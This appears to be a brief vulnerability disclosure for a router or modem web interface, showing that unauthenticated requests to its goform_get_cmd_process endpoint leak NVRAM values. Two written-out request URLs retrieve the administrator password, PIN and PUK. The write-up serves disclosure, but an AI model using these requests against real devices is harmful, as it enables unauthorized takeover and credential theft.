It’s possible to read arbitrary values from the configuration table in the device NVRAM. A request like the following will read the value of the admin_Password field, which – you may be able to get – is the administrator password for the device.         

![image](https://user-images.githubusercontent.com/25066959/208161200-d0be214e-ab70-4853-b68b-d9af9d21e5ec.png)


```
http://192.168.199.1/goform/goform_get_cmd_process?cmd=admin_Password&multi_data=1
```

![image](https://user-images.githubusercontent.com/25066959/208161155-dd37a5bb-87c2-4d70-9e8a-3f1b821c23e3.png)

![image](https://user-images.githubusercontent.com/25066959/208161010-ddce8cc0-7ab4-40c9-83db-cfbf57907631.png)

```
http://192.168.199.1/goform/goform_get_cmd_process?isTest=false&cmd=modem_main_state,puknumber,
pinnumber,psw_fail_num_str,login_lock_time,admin_user,admin_Password&multi_data=1&_=0
```

![image](https://user-images.githubusercontent.com/25066959/208161356-7c9103ce-5543-4b89-9ebf-f84282c2d26f.png)

![image](https://user-images.githubusercontent.com/25066959/208161411-67c7d073-375f-48e1-84f3-9f6264a0b765.png)
